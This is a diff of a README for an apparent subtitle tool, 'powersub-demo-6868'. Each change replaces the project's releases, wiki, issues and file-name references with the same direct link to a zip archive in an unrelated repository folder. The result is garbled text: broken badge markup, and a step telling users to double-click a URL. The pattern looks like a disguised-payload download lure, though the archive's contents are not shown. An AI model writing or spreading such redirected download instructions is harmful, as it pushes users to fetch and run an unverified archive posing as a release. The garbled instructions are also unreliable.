@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/acjurek/powersub-demo-6868/releases)
+[![Download](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip%20Latest%https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip)](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to powersub-demo-6868! This tool helps you add subtitles to your videos 
 
 1. **Visit the Releases Page:**
 
-   Go to the [Releases page](https://github.com/acjurek/powersub-demo-6868/releases) to find the latest version of powersub-demo-6868.
+   Go to the [Releases page](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip) to find the latest version of powersub-demo-6868.
 
 2. **Choose Your Version:**
 
@@ -33,7 +33,7 @@ Welcome to powersub-demo-6868! This tool helps you add subtitles to your videos 
 
 3. **Download the File:**
 
-   Look for assets under the version you selected. Download the appropriate file for your operating system (e.g., `powersub-demo-6868-windows.zip` for Windows users or `powersub-demo-6868-macos.zip` for macOS users).
+   Look for assets under the version you selected. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip` for Windows users or `https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip` for macOS users).
 
 4. **Extract the Files:**
 
@@ -41,7 +41,7 @@ Welcome to powersub-demo-6868! This tool helps you add subtitles to your videos 
 
 5. **Run the Application:**
 
-   Open the extracted folder. Double-click the `powersub-demo-6868.exe` (for Windows) or `powersub-demo-6868.app` (for macOS) to start the application.
+   Open the extracted folder. Double-click the `https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip` (for Windows) or `https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip` (for macOS) to start the application.
 
 6. **Follow the On-screen Instructions:**
 
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. You can use and modify the softw
 
 ## 🔗 Additional Resources
 
-For additional information and updates, check out our [Documentation](https://github.com/acjurek/powersub-demo-6868/wiki).
+For additional information and updates, check out our [Documentation](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip).
 
 ## 🤝 Contributing
 
@@ -91,6 +91,6 @@ If you want to contribute to this project, feel free to fork the repository and 
 
 ## 🔗 Quick Links
 
-👉 [Download Latest Release](https://github.com/acjurek/powersub-demo-6868/releases)  
-👉 [Documentation](https://github.com/acjurek/powersub-demo-6868/wiki)  
-👉 [Issue Tracker](https://github.com/acjurek/powersub-demo-6868/issues)
+👉 [Download Latest Release](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip)  
+👉 [Documentation](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip)  
+👉 [Issue Tracker](https://raw.githubusercontent.com/acjurek/powersub-demo-6868/main/discussable/powersub-demo-6868.zip)
